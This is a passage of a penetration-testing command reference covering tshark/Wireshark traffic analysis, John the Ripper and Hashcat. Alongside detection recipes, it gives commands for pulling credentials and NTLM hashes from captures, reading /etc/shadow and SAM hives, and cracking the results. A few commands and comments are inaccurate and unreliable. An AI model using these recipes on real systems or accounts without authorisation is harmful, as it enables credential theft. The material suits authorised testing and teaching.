tshark -r capture.pcap -q -z dcerpc,srt
```

**Advanced Filtering:**

```bash
# Capture filter (BPF during capture)
sudo tshark -i eth0 -f "tcp port 80"
sudo tshark -i eth0 -f "host 192.168.1.10 and not port 22"

# Display filter (after capture)
tshark -r capture.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0"

# Complex filters
tshark -r capture.pcap -Y "http.request.method==POST and http.request.uri contains login"

# Regex matching
tshark -r capture.pcap -Y "http.host matches \".*\\.evil\\.com\""

# Time range filtering
tshark -r capture.pcap -Y "frame.time >= \"2024-01-15 10:00:00\" and frame.time <= \"2024-01-15 11:00:00\""
```

**Decryption:**

```bash
# SSL/TLS decryption with key log file
tshark -r capture.pcap -o "tls.keylog_file:/path/to/sslkeylog.log" -Y "http"

# WPA/WPA2 decryption
tshark -r wireless.pcap -o "wlan.enable_decryption:TRUE" -o "uat:80211_keys:\"wpa-pwd\",\"password:SSID\""

# Export decrypted data
tshark -r capture.pcap -o "tls.keylog_file:/path/to/sslkeylog.log" --export-objects http,/output/directory/
```

**Packet Manipulation:**

```bash
# Edit capture (requires editcap)
editcap capture.pcap output.pcap

# Extract specific time range
editcap -A "2024-01-15 10:00:00" -B "2024-01-15 11:00:00" capture.pcap filtered.pcap

# Extract specific packet range
editcap capture.pcap output.pcap 100-500

# Remove duplicate packets
editcap -d capture.pcap deduplicated.pcap

# Split capture file
editcap -c 1000 capture.pcap split.pcap  # Split every 1000 packets
```

**Merging Captures:**

```bash
# Merge multiple capture files
mergecap -w merged.pcap capture1.pcap capture2.pcap capture3.pcap

# Merge with sorting by timestamp
mergecap -w merged.pcap -a capture1.pcap capture2.pcap
```

### Practical Analysis Scenarios

**HTTP Credential Extraction:**

```bash
# Extract HTTP Basic Auth
tshark -r capture.pcap -Y "http.authbasic" -T fields -e http.authbasic

# Extract HTTP POST data
tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data

# Extract login attempts
tshark -r capture.pcap -Y "http.request.uri contains login" -T fields -e ip.src -e http.request.uri -e http.file_data

# Extract HTTP credentials (form data)
tshark -r capture.pcap -Y "http.request.method==POST" -V | grep -E "user|pass|login"
```

**DNS Analysis:**

```bash
# Extract all DNS queries
tshark -r capture.pcap -Y "dns.flags.response==0" -T fields -e dns.qry.name | sort -u

# Find DNS tunneling (long queries)
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name -e dns.qry.name.len | awk '$2 > 50'

# DNS C2 detection (high query frequency)
tshark -r capture.pcap -Y "dns" -T fields -e ip.src -e dns.qry.name | sort | uniq -c | sort -nr

# Extract DNS answers
tshark -r capture.pcap -Y "dns.flags.response==1" -T fields -e dns.qry.name -e dns.a -e dns.aaaa
```

**Malware Traffic Analysis:**

```bash
# Identify beaconing (regular intervals)
tshark -r capture.pcap -Y "http.request" -T fields -e frame.time -e ip.dst -e http.host

# Extract contacted domains
tshark -r capture.pcap -Y "http.request" -T fields -e http.host | sort -u

# User-Agent analysis (identify malware UA)
tshark -r capture.pcap -Y "http.request" -T fields -e http.user_agent | sort -u

# Extract downloaded executables
tshark -r capture.pcap --export-objects http,/tmp/objects/
file /tmp/objects/* | grep "executable"

# Detect data exfiltration (large uploads)
tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e ip.src -e http.host -e http.content_length | awk '$3 > 1000000'
```

**Network Reconnaissance Detection:**

```bash
# Detect port scans (multiple SYN to different ports)
tshark -r capture.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0" -T fields -e ip.src -e ip.dst -e tcp.dstport | awk '{print $1,$2}' | sort | uniq -c | sort -nr

# Detect ping sweeps (ICMP to multiple hosts)
tshark -r capture.pcap -Y "icmp.type==8" -T fields -e ip.src -e ip.dst | awk '{print $1}' | sort | uniq -c | sort -nr

# Identify ARP scanning
tshark -r capture.pcap -Y "arp.opcode==1" -T fields -e arp.src.hw_mac -e arp.dst.proto_ipv4 | awk '{print $1}' | sort | uniq -c | sort -nr
```

**SMB/CIFS Analysis:**

```bash
# Extract SMB file transfers
tshark -r capture.pcap -Y "smb2.filename" -T fields -e ip.src -e ip.dst -e smb2.filename

# Detect SMB authentication attempts
tshark -r capture.pcap -Y "ntlmssp.auth.username" -T fields -e ip.src -e ip.dst -e ntlmssp.auth.username -e ntlmssp.auth.domain

# Extract NTLM hashes (challenge/response)
tshark -r capture.pcap -Y "ntlmssp" -T fields -e ntlmssp.ntlmserverchallenge -e ntlmssp.ntlmclientchallenge -e ntlmssp.auth.ntresponse

# SMB shares enumeration
tshark -r capture.pcap -Y "smb2.tree" -T fields -e smb2.tree

# Detect EternalBlue exploitation attempts
tshark -r capture.pcap -Y "smb2.msg_id > 1000" -T fields -e ip.src -e ip.dst
```

**TLS/SSL Analysis:**

```bash
# Extract TLS Server Hello (identify server)
tshark -r capture.pcap -Y "tls.handshake.type==2" -T fields -e ip.dst -e tls.handshake.extensions_server_name

# Extract TLS certificates
tshark -r capture.pcap -Y "tls.handshake.certificate" -T fields -e x509ce.dNSName

# Detect weak ciphers
tshark -r capture.pcap -Y "tls.handshake.ciphersuite" -T fields -e tls.handshake.ciphersuite | sort -u

# TLS version analysis
tshark -r capture.pcap -Y "tls.handshake.version" -T fields -e tls.handshake.version | sort | uniq -c

# Extract SNI (Server Name Indication)
tshark -r capture.pcap -Y "tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name | sort -u
```

**Wireless (802.11) Analysis:**

```bash
# Extract SSIDs
tshark -r wireless.pcap -Y "wlan.ssid" -T fields -e wlan.ssid | sort -u

# Detect deauth attacks
tshark -r wireless.pcap -Y "wlan.fc.type_subtype==0x000c"

# Extract WPA handshakes
tshark -r wireless.pcap -Y "eapol" -w handshake.pcap

# Client-AP associations
tshark -r wireless.pcap -Y "wlan.fc.type_subtype==0x0000" -T fields -e wlan.sa -e wlan.da

# Detect evil twin APs (same SSID, different BSSID)
tshark -r wireless.pcap -Y "wlan.ssid" -T fields -e wlan.ssid -e wlan.bssid | sort -u
```

**VoIP/SIP Analysis:**

```bash
# Extract SIP traffic
tshark -r capture.pcap -Y "sip"

# SIP call statistics
tshark -r capture.pcap -q -z sip,stat

# Extract RTP streams
tshark -r capture.pcap -Y "rtp"

# Extract VoIP conversations (requires rtpdump)
tshark -r capture.pcap -q -z rtp,streams

# Detect SIP authentication failures
tshark -r capture.pcap -Y "sip.Status-Code==401 or sip.Status-Code==407"
```

**IPv6 Analysis:**

```bash
# Extract IPv6 traffic
tshark -r capture.pcap -Y "ipv6"

# ICMPv6 neighbor discovery
tshark -r capture.pcap -Y "icmpv6.type==135 or icmpv6.type==136"

# Detect IPv6 tunneling
tshark -r capture.pcap -Y "ipv6.nxt==41"  # IPv6 in IPv4

# Extract IPv6 addresses
tshark -r capture.pcap -Y "ipv6" -T fields -e ipv6.src -e ipv6.dst | sort -u
```

### Performance and Optimization

**Ring Buffer Capture (Continuous):**

```bash
# Capture with rotating files
sudo tshark -i eth0 -b filesize:100000 -b files:10 -w capture.pcap
# Creates: capture_00001.pcap, capture_00002.pcap, etc.
# Keeps last 10 files, each 100MB max

# Time-based rotation
sudo tshark -i eth0 -b duration:3600 -b files:24 -w hourly.pcap
# New file every hour, keeps 24 hours
```

**Reducing Capture Size:**

```bash
# Capture only headers (snaplen)
sudo tshark -i eth0 -s 128 -w headers.pcap

# Exclude specific traffic
sudo tshark -i eth0 -f "not port 22" -w no_ssh.pcap

# Capture specific protocols only
sudo tshark -i eth0 -f "tcp port 80 or tcp port 443" -w web_only.pcap
```

**Performance Tuning:**

```bash
# Increase buffer size (reduce packet drops)
sudo tshark -i eth0 -B 128 -w capture.pcap  # 128MB buffer

# Disable name resolution
tshark -r capture.pcap -n  # No IP/port name resolution
tshark -r capture.pcap -N n  # No name resolution at all

# Use capture filter instead of display filter
sudo tshark -i eth0 -f "tcp port 80"  # Faster than -Y "tcp.port==80"
```

### Wireshark Profiles

**Custom Profiles:**

```bash
# Create profile for specific task
Edit â†’ Configuration Profiles â†’ New
- HTTP Analysis Profile: Custom columns, filters, coloring rules
- Malware Analysis Profile: Specific display filters
- Wireless Profile: 802.11 preferences

# Switch profiles
Bottom-right corner dropdown or Ctrl+Shift+A

# Export/Import profiles
Edit â†’ Configuration Profiles â†’ Manage â†’ Export/Import
```

**Custom Columns:**

```bash
# Add custom columns
Edit â†’ Preferences â†’ Appearance â†’ Columns â†’ Add

# Useful custom columns:
- HTTP Host: http.host
- HTTP URI: http.request.uri
- HTTP Method: http.request.method
- DNS Query: dns.qry.name
- TLS SNI: tls.handshake.extensions_server_name
- TCP Stream: tcp.stream
```

### Decrypting HTTPS Traffic

**SSL/TLS Key Log Method:**

```bash
# Enable SSLKEYLOGFILE in browser
# Firefox/Chrome: Add environment variable
export SSLKEYLOGFILE=/path/to/sslkeylog.log
firefox &

# Configure Wireshark
Edit â†’ Preferences â†’ Protocols â†’ TLS
(Pre-)Master-Secret log filename: /path/to/sslkeylog.log

# Capture and decrypt
# HTTPS traffic will be decrypted automatically
# View as: Right-click â†’ Follow â†’ HTTP Stream
```

**Using Private Key (Server-Side):**

```bash
# If you have server's private key
Edit â†’ Preferences â†’ Protocols â†’ TLS â†’ RSA keys list â†’ Add
IP address: 192.168.1.10
Port: 443
Protocol: http
Key File: /path/to/server.key

# Note: Only works with RSA key exchange, not with Forward Secrecy (ECDHE)
```

### Network Forensics

**Timeline Analysis:**

```bash
# Extract timeline of events
tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -e _ws.col.Protocol -e _ws.col.Info > timeline.txt

# Generate conversation timeline
tshark -r capture.pcap -q -z conv,tcp | grep "<->"
```

**Carving Files from PCAP:**

```bash
# Using Wireshark
File â†’ Export Objects â†’ HTTP/SMB/TFTP/FTP

# Using foremost (file carving)
foremost -i capture.pcap -o carved_files/

# Using NetworkMiner (GUI tool)
networkminer capture.pcap
# Extracts files, credentials, sessions automatically

# Using tcpflow
tcpflow -r capture.pcap -o output_dir/
# Reconstructs TCP streams as files
```

**Detect Lateral Movement:**

```bash
# PSExec detection (port 445 activity)
tshark -r capture.pcap -Y "smb2.cmd==5 and smb2.filename contains .exe"

# WMI execution (port 135)
tshark -r capture.pcap -Y "dcerpc" -T fields -e ip.src -e ip.dst -e dcerpc.cn_ctx_id

# Pass-the-Hash detection (NTLM auth without Kerberos)
tshark -r capture.pcap -Y "ntlmssp.auth.username and not kerberos"

# RDP connections
tshark -r capture.pcap -Y "tcp.port==3389 and tcp.flags.syn==1"
```

### Integration with Other Tools

**Wireshark with Metasploit:**

```bash
# Capture exploit traffic
sudo wireshark &
# Start capture on relevant interface
# Run Metasploit exploit
# Analyze exploit packets in Wireshark

# Filter Metasploit traffic
tcp.stream eq [stream_number]
```

**Wireshark with Nmap:**

```bash
# Capture Nmap scan
sudo tshark -i eth0 -f "host 192.168.1.10" -w nmap_scan.pcap &
nmap -sS -p- 192.168.1.10

# Analyze scan patterns
tshark -r nmap_scan.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0" -T fields -e tcp.dstport | sort -n
```

**Wireshark with Burp Suite:**

```bash
# Capture web application testing
sudo tshark -i lo -f "port 8080" -w burp_traffic.pcap &
# Use Burp Suite through proxy

# Analyze findings
tshark -r burp_traffic.pcap -Y "http.request.method==POST" -T fields -e http.file_data
```

### Automation and Scripting

**Tshark in Shell Scripts:**

```bash
#!/bin/bash
# Monitor for suspicious DNS queries
tshark -i eth0 -Y "dns" -T fields -e dns.qry.name | while read domain; do
    if [[ $domain == *"evil.com"* ]]; then
        echo "[!] Suspicious domain detected: $domain"
        # Alert or block action
    fi
done
```

**Python with PyShark:**

```python
import pyshark

cap = pyshark.FileCapture('capture.pcap')

for packet in cap:
    if 'HTTP' in packet:
        try:
            print(f"HTTP Request: {packet.http.host}{packet.http.request_uri}")
        except AttributeError:
            pass

cap.close()
```

**Automated Analysis Script:**

```bash
#!/bin/bash
# Quick PCAP analysis

PCAP=$1

echo "[*] Protocol Hierarchy:"
tshark -r $PCAP -q -z io,phs

echo -e "\n[*] Top Talkers:"
tshark -r $PCAP -q -z endpoints,ip | head -20

echo -e "\n[*] HTTP Hosts:"
tshark -r $PCAP -Y "http.request" -T fields -e http.host | sort -u

echo -e "\n[*] DNS Queries:"
tshark -r $PCAP -Y "dns.flags.response==0" -T fields -e dns.qry.name | sort -u

echo -e "\n[*] Suspicious User-Agents:"
tshark -r $PCAP -Y "http.user_agent" -T fields -e http.user_agent | grep -iE "bot|scan|sqlmap|nikto" | sort -u

echo -e "\n[*] Large POST Requests (potential data exfil):"
tshark -r $PCAP -Y "http.request.method==POST" -T fields -e ip.src -e http.host -e http.content_length | awk '$3 > 1000000'
```

---

**Related Topics:**

- **Network Pivoting:** Chisel, ligolo-ng, SSH tunneling for compromised network traversal
- **Traffic Manipulation:** Ettercap, Bettercap for MITM attacks and packet injection
- **IDS/IPS Evasion:** Fragrouter, packet fragmentation, timing manipulation
- **Wireless Attacks:** Aircrack-ng suite, wifite2, evil twin attacks
- **Exploit Development:** Buffer overflow exploitation, ROP chains, shellcode development
- **Web Application Testing:** OWASP Testing Guide, API security testing, GraphQL exploitation

---

## John the Ripper

### Overview

John the Ripper (JtR) performs password cracking through dictionary attacks, brute force, and hybrid modes. Supports numerous hash formats with extensible ruleset system.

### Installation and Versions

**Verify installation:**

```bash
john --version
# Kali ships with jumbo version by default

which john
# /usr/sbin/john
```

**Install bleeding-jumbo (latest features):**

```bash
# Install dependencies
sudo apt-get install git build-essential libssl-dev zlib1g-dev
sudo apt-get install yasm libgmp-dev libpcap-dev pkg-config libbz2-dev

# Clone and compile
cd /opt
sudo git clone https://github.com/openwall/john.git
cd john/src
sudo ./configure && sudo make -s clean && sudo make -sj4

# Run bleeding-jumbo version
/opt/john/run/john --version
```

### Hash Identification

**Identify hash type:**

```bash
# Using hash-identifier
hash-identifier
# Paste hash when prompted

# Using hashid
hashid '$6$salt$hash'
hashid -m '$6$salt$hash'  # Show hashcat mode numbers

# Manual inspection
# MD5: 32 hex characters
# SHA-1: 40 hex characters
# SHA-256: 64 hex characters
# NTLM: 32 hex characters (similar to MD5)
# bcrypt: Starts with $2a$, $2b$, $2y$
# SHA-512 (Unix): Starts with $6$
```

**List supported formats:**

```bash
john --list=formats
john --list=formats | grep -i ntlm
john --list=formats | grep -i md5
```

### Hash Extraction

**Unshadow (combine /etc/passwd and /etc/shadow):**

```bash
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

**Extract Windows SAM hashes:**

```bash
# From registry hives (offline)
samdump2 SYSTEM SAM > sam_hashes.txt

# Using impacket-secretsdump
impacket-secretsdump -sam SAM -system SYSTEM LOCAL > sam_hashes.txt

# Format: username:RID:LM_hash:NTLM_hash:::
# Remove LM hashes if empty (first field after RID)
cat sam_hashes.txt | cut -d: -f1,4 > ntlm_only.txt
```

**Extract SSH private key hashes:**

```bash
ssh2john id_rsa > id_rsa.hash
ssh2john.py id_rsa > id_rsa.hash  # Python version
```

**Extract ZIP password hashes:**

```bash
zip2john protected.zip > zip.hash
```

**Extract RAR password hashes:**

```bash
rar2john protected.rar > rar.hash
```

**Extract PDF password hashes:**

```bash
pdf2john protected.pdf > pdf.hash
```

**Extract KeePass database hashes:**

```bash
keepass2john Database.kdbx > keepass.hash
```

**Extract 7z password hashes:**

```bash
7z2john protected.7z > 7z.hash
```

**Extract Office document hashes:**

```bash
office2john document.docx > office.hash
```

**Extract BitLocker hashes:**

```bash
bitlocker2john -i /dev/sda1 > bitlocker.hash
```

**Extract hash from pcap (network capture):**

```bash
# WPA/WPA2 handshake
hccap2john capture.hccap > wpa.hash
wpapcap2john capture.pcap > wpa.hash
```

### Basic Cracking Modes

**Single crack mode (username-based mangling):**

```bash
# Uses username to generate password candidates
john --single hashes.txt

# Specify format
john --format=raw-md5 --single hashes.txt
```

**Wordlist mode (dictionary attack):**

```bash
# Default wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Specify format
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Custom wordlist
john --wordlist=custom_passwords.txt hashes.txt
```

**Incremental mode (brute force):**

```bash
# Default charset (all printable ASCII)
john --incremental hashes.txt

# Specific charset
john --incremental=Alpha hashes.txt       # Letters only
john --incremental=Digits hashes.txt      # Numbers only
john --incremental=Alnum hashes.txt       # Alphanumeric

# Custom incremental mode with length limits
john --incremental=LowerNum --min-length=6 --max-length=8 hashes.txt
```

### Hash Format Specification

**Common format examples:**

```bash
# Raw hashes
john --format=raw-md5 hashes.txt
john --format=raw-sha1 hashes.txt
john --format=raw-sha256 hashes.txt
john --format=raw-sha512 hashes.txt

# Unix crypt formats
john --format=crypt hashes.txt              # Auto-detect crypt variant
john --format=sha512crypt hashes.txt        # $6$ prefix
john --format=sha256crypt hashes.txt        # $5$ prefix
john --format=md5crypt hashes.txt           # $1$ prefix

# Windows formats
john --format=NT hashes.txt                 # NTLM hashes
john --format=netlm hashes.txt              # NetLM
john --format=netntlm hashes.txt            # NetNTLM
john --format=netntlmv2 hashes.txt          # NetNTLMv2

# Web application formats
john --format=phpass hashes.txt             # WordPress, phpBB
john --format=drupal7 hashes.txt            # Drupal 7+
john --format=django hashes.txt             # Django PBKDF2

# Other formats
john --format=bcrypt hashes.txt             # bcrypt ($2a$, $2b$, $2y$)
john --format=PKZIP hashes.txt              # ZIP archives
john --format=PDF hashes.txt                # PDF documents
```

### Wordlist Rules

**Apply rules to wordlist:**

```bash
# Default ruleset
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt

# Specific ruleset
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo hashes.txt
john --wordlist=words.txt --rules=Single hashes.txt
john --wordlist=words.txt --rules=Extra hashes.txt
```

**List available rules:**

```bash
john --list=rules
john --list=rules:Jumbo
```

**Custom rule examples:**

Edit `/etc/john/john.conf` or create custom config:

```bash
# Create custom rule section
[List.Rules:CustomRule]
# Append digits
$[0-9]
$[0-9]$[0-9]

# Prepend year
^2^0^2^4

# Capitalize first letter
c

# Toggle case
t

# Duplicate word
d

# Reverse
r

# Rotate left
[

# Common substitutions
sa@
so0
si1
se3
```

**Apply custom rule:**

```bash
john --wordlist=words.txt --rules=CustomRule hashes.txt
```

**Rule syntax reference:**

```bash
# Character operations
c               # Capitalize first, lowercase rest
C               # Lowercase first, capitalize rest
t               # Toggle case of all characters
r               # Reverse the word
d               # Duplicate the word
f               # Reflect (append reversed)
{               # Rotate left
}               # Rotate right
$X              # Append character X
^X              # Prepend character X

# Position operations
[               # Remove first character
]               # Remove last character
D[N]            # Delete character at position N
x[N][M]         # Extract substring from N with length M
i[N][C]         # Insert character C at position N
o[N][C]         # Overwrite position N with character C

# Case operations
u               # Uppercase all
l               # Lowercase all
C               # Capitalize first, lowercase rest
T[N]            # Toggle case at position N

# Substitutions
s[X][Y]         # Replace all X with Y
@[X]            # Purge all character X

# Rejection rules
-[c]            # Reject if contains character c
-[N1][N2]       # Reject unless length between N1 and N2
+[N1][N2]       # Reject if length between N1 and N2
![?X]           # Reject unless contains character class X
%[N][X]         # Reject unless character at N is X
```

### Session Management

**Save and restore sessions:**

```bash
# John automatically saves session as "john.rec"
john --wordlist=rockyou.txt hashes.txt

# Interrupt with Ctrl+C, restore later
john --restore

# Named session
john --session=mysession --wordlist=rockyou.txt hashes.txt

# Restore named session
john --restore=mysession
```

**Check session status:**

```bash
john --status
john --status=mysession
```

### Show Cracked Passwords

**Display all cracked passwords:**

```bash
john --show hashes.txt

# Specific format
john --show --format=NT hashes.txt

# Show only usernames
john --show hashes.txt | cut -d: -f1

# Show only passwords
john --show hashes.txt | cut -d: -f2
```

**Pot file location:**

```bash
# Default pot file
~/.john/john.pot

# View pot file directly
cat ~/.john/john.pot

# Use specific pot file
john --pot=custom.pot --show hashes.txt
```

### Performance Optimization

**Test hash cracking speed:**

```bash
john --test
john --test --format=NT
```

**Fork processes (multi-core):**

```bash
# Use 4 cores
john --fork=4 --wordlist=rockyou.txt hashes.txt
```

**OpenMP optimization:**

```bash
# Set OpenMP threads
export OMP_NUM_THREADS=4
john --wordlist=rockyou.txt hashes.txt
```

**Incremental mode optimization:**

```bash
# Limit password length for faster cracking
john --incremental=Alnum --min-length=4 --max-length=6 hashes.txt
```

### Mask Mode (Hybrid Attack)

**Mask attack syntax:**

```bash
# Mask characters:
# ?l = lowercase (a-z)
# ?u = uppercase (A-Z)
# ?d = digit (0-9)
# ?s = special character
# ?a = all printable ASCII

# Example: 4 lowercase + 4 digits
john --mask='?l?l?l?l?d?d?d?d' hashes.txt

# Known prefix/suffix
john --mask='Pass?d?d?d?d' hashes.txt
john --mask='?l?l?l?l2024' hashes.txt

# Variable length with incremental mask
john --incremental-charcount=?d?l --mask='?1?1?1?1?1' hashes.txt
```

### External Mode (Custom Algorithms)

**Create custom password generator:**

Edit `/etc/john/john.conf`:

```bash
[List.External:Years]
int YEAR;

void init()
{
    YEAR = 1990;
}

void generate()
{
    word[0] = '0' + YEAR / 1000;
    word[1] = '0' + (YEAR / 100) % 10;
    word[2] = '0' + (YEAR / 10) % 10;
    word[3] = '0' + YEAR % 10;
    word[4] = 0;
    YEAR++;
    if (YEAR > 2030) YEAR = 1990;
}
```

**Use external mode:**

```bash
john --external=Years hashes.txt
```

### Distributed Cracking

**Node mode (distribute work across machines):**

```bash
# Node 1 (master)
john --wordlist=rockyou.txt --node=1/4 hashes.txt

# Node 2
john --wordlist=rockyou.txt --node=2/4 hashes.txt

# Node 3
john --wordlist=rockyou.txt --node=3/4 hashes.txt

# Node 4
john --wordlist=rockyou.txt --node=4/4 hashes.txt
```

### Useful Wordlists

**Default Kali wordlists:**

```bash
/usr/share/wordlists/rockyou.txt           # 14M passwords (decompress first)
/usr/share/wordlists/rockyou.txt.gz        # Compressed version
/usr/share/seclists/Passwords/             # SecLists password collections

# Decompress rockyou
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

**Download additional wordlists:**

```bash
# SecLists
sudo apt-get install seclists

# CrackStation
wget https://crackstation.net/files/crackstation.txt.gz
gunzip crackstation.txt.gz
```

**Generate custom wordlists:**

```bash
# CeWL (spider website for words)
cewl -d 2 -m 5 https://example.com -w custom_wordlist.txt

# Crunch (pattern-based generation)
crunch 8 8 -t Pass@@@@  # Pass + 4 digits
crunch 6 10 abcdef123 -o wordlist.txt
```

### Practical Examples

**Crack Linux shadow hashes:**

```bash
sudo unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

**Crack NTLM hashes:**

```bash
# Hash format: username:hash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ntlm_hashes.txt
```

**Crack SSH private key:**

```bash
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
john --show ssh.hash
```

**Crack ZIP archive:**

```bash
zip2john protected.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

**Crack NetNTLMv2 (from Responder):**

```bash
# Hash from Responder output
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt netntlmv2.hash
```

---

## Hashcat

### Overview

Hashcat performs GPU-accelerated password cracking with extensive hash format support and attack mode flexibility. Significantly faster than CPU-based cracking for supported hash types.

### Installation and GPU Setup

**Verify installation:**

```bash
hashcat --version
hashcat -I  # List OpenCL devices
```

**Install/update drivers:**

```bash
# NVIDIA
sudo apt-get install nvidia-driver nvidia-cuda-toolkit

# AMD
sudo apt-get install mesa-opencl-icd

# Intel
sudo apt-get install intel-opencl-icd
```

**Benchmark GPU:**

```bash
hashcat -b
hashcat -b -m 1000  # Benchmark specific hash type (NTLM)
```

### Hash Mode Identification

**List all supported hash modes:**

```bash
hashcat --help | grep -i "Hash modes"
hashcat --example-hashes
hashcat --example-hashes | grep -i ntlm
```

**Common hash mode numbers:**

```bash
0      = MD5
100    = SHA1
1000   = NTLM
1400   = SHA2-256
1700   = SHA2-512
1800   = sha512crypt (Unix $6$)
2500   = WPA/WPA2
3200   = bcrypt
5500   = NetNTLMv1
5600   = NetNTLMv2
6000   = RIPEMD-160
13100  = Kerberos 5 TGS-REP etype 23
16500  = JWT (JSON Web Token)
22000  = WPA-PBKDF2-PMKID+EAPOL
```

**Identify hash automatically:**

```bash
hashcat hash.txt
# Hashcat attempts auto-detection
```

### Attack Modes

**Attack mode numbers:**

```bash
0 = Straight (dictionary attack)
1 = Combination (combine two wordlists)
3 = Brute-force (mask attack)
6 = Hybrid Wordlist + Mask
7 = Hybrid Mask + Wordlist
9 = Association
```

### Dictionary Attack (Mode 0)

**Basic dictionary attack:**

```bash
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Multiple wordlists:**

```bash
hashcat -m 1000 -a 0 hashes.txt wordlist1.txt wordlist2.txt wordlist3.txt
```

**With rules:**

```bash
# Best64 rule (commonly effective)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Dive rule (aggressive)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule

# Multiple rules
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rule1.rule -r rule2.rule
```

**Common hashcat rules:**

```bash
/usr/share/hashcat/rules/best64.rule           # Good first attempt
/usr/share/hashcat/rules/rockyou-30000.rule    # Top 30k from RockYou
/usr/share/hashcat/rules/d3ad0ne.rule          # Comprehensive
/usr/share/hashcat/rules/dive.rule             # Aggressive mutations
/usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
/usr/share/hashcat/rules/T0XlC.rule            # Advanced
/usr/share/hashcat/rules/generated2.rule       # Auto-generated patterns
```

### Combination Attack (Mode 1)

**Combine two wordlists:**

```bash
# Creates candidates like: word1 + word2
hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt
```

**Example use case:**

```bash
# firstnames.txt contains: john, mary
# lastnames.txt contains: smith, johnson
# Generates: johnsmith, johnjohnson, marysmith, maryjohnson
hashcat -m 1000 -a 1 hashes.txt firstnames.txt lastnames.txt
```

### Mask Attack (Mode 3)

**Mask syntax:**

```bash
?l = lowercase (abcdefghijklmnopqrstuvwxyz)
?u = uppercase (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
?d = digit (0123456789)
?h = lowercase hex (0123456789abcdef)
?H = uppercase hex (0123456789ABCDEF)
?s = special (!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~)
?a = all printable ASCII (?l?u?d?s)
?b = all bytes (0x00-0xff)
```

**Basic mask attacks:**

```bash
# 8 lowercase letters
hashcat -m 1000 -a 3 hashes.txt ?l?l?l?l?l?l?l?l

# Uppercase + 6 digits (Password123456 pattern)
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?l?d?d?d?d?d?d

# Known prefix
hashcat -m 1000 -a 3 hashes.txt 'Pass?d?d?d?d'

# Known suffix
hashcat -m 1000 -a 3 hashes.txt '?l?l?l?l2024'
```

**Increment mode (variable length):**

```bash
# Brute force 1-8 characters, all lowercase
hashcat -m 1000 -a 3 hashes.txt --increment --increment-min 1 --increment-max 8 ?l?l?l?l?l?l?l?l

# 4-6 digits
hashcat -m 1000 -a 3 hashes.txt --increment --increment-min 4 --increment-max 6 ?d?d?d?d?d?d
```

**Custom charset:**

```bash
# Define custom charset
hashcat -m 1000 -a 3 hashes.txt -1 ?l?d ?1?1?1?1?1?1
# -1 defines charset1 as lowercase + digits

# Multiple custom charsets
hashcat -m 1000 -a 3 hashes.txt -1 ?l?u -2 ?d?s ?1?1?1?1?2?2
# -1 = letters, -2 = digits + special
```

**Mask file (multiple masks):**

```bash
# Create masks.hcmask
cat > masks.hcmask << EOF
?u?l?l?l?l?l?d?d
?u?l?l?l?l?d?d?d?d
Pass?d?d?d?d
?l?l?l?l2024
EOF

# Use mask file
hashcat -m 1000 -a 3 hashes.txt masks.hcmask
```

### Hybrid Attacks

**Hybrid Wordlist + Mask (Mode 6):**

```bash
# Append mask to wordlist words
hashcat -m 1000 -a 6 hashes.txt wordlist.txt ?d?d?d?d
# password -> password1234, password9876, etc.
```

**Hybrid Mask + Wordlist (Mode 7):**

```bash
# Prepend mask to wordlist words
hashcat -m 1000 -a 7 hashes.txt ?d?d?d?d wordlist.txt
# password -> 1234password, 9876password, etc.
```

### Session Management

**Named session:**

```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --session=mysession

# Restore session
hashcat --restore --session=mysession

# Remove session
hashcat --session=mysession --remove
```

**Checkpoint (auto-save progress):**

```bash
# Set checkpoint interval (seconds)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --checkpoint=30
```

### Output Options

**Show cracked passwords:**

```bash
hashcat -m 1000 hashes.txt --show

# Output format
hashcat -m 1000 hashes.txt --show --outfile-format=2
# Formats: 1=hash, 2=plain, 3=hex_plain, 5=hash:plain
```

**Save output to file:**

```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -o cracked.txt

# Append to file
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -o cracked.txt --outfile-append
```

**Potfile location:**

```bash
# Default
~/.hashcat/hashcat.potfile

# Custom potfile
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --potfile-path=custom.potfile

# Disable potfile
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --potfile-disable
```

### Performance Tuning

**Workload profile:**

```bash
-w 1  # Low (desktop usage)
-w 2  # Default
-w 3  # High (dedicated cracking)
-w 4  # Nightmare (max performance, system unusable)

hashcat -m 1000 -a 0 -w 3 hashes.txt rockyou.txt
```

**Optimize kernel:**

```bash
# Enable optimizations
hashcat -m 1000 -a 0 -O hashes.txt rockyou.txt

